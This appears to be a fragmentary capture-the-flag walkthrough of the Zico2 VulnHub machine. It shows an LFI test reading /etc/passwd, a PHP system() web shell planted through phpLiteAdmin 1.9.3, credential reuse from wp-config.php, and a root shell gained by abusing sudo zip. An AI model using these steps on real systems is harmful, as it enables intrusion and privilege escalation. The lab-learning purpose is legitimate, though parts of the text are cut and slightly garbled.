...
comments: true
---
This is a boot2root machine hosted on vulnhub that was created by @rafasantos5. Its graded as intermediate but I rank it as intermediate to hard. As this is purely for educational purposes I'll throw in spoilers now. Its got LFI, default app credentials and being an old VM we can throw some kernel exploits at it.  To exploit this machine we'll need to chain a two different exploits. At the end we'll also include some mitigation strategies. Without much further ado here we go.
...
We'll be using `nmapAutomator` a great tool for enumeration. We'll start with an nmap `scan`:
...
22/tcp    open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; pACrotocol 2.0)
...
We can use curl to view the links on the page. 
```
curl zico -s -L | grep "title\|href" | sed -e 's/^[[:space:]]*//'
...
...
The link looks susceptible to LFI. Testing it out `http://192.168.109.143/view.php?page=../../etc/passwd`
...
```
Port 80 is open we'll run dirb/gobuster/dirbuster to bruteforce the directories;
...
Navigating to `test_db.php` we find the phpliteadmin app v 1.9.3. Quick search tells us this version is vulnerable.
```
...
2. Create a table e.g pwn and write php code `<?php echo system($_REQUEST ["cmd"]); ?>` into it.

![10.png](/assets/images/posts/zico-2-vulnhub-walkthrough/10.png)

Cool now that we have our table created and we know we've got ALFI, possibly code execution we go to `/view.php?page=../../usr/databases/rs.php&cmd=ls`
...
```
We have a look at `view.php`; this is where the vulnerability lies;
...
We try to log in as zico with the creds from wp-config.php;
...
As seen above we can execute commands as root with no passwords using zip.

```
zico@zico:~$ sudo zip wordpress-4.8.zip raj.txt -T --unzip-command="sh -c/bin/bash"
updating: raj.txt (deflated 43%)
root@zico:~# id
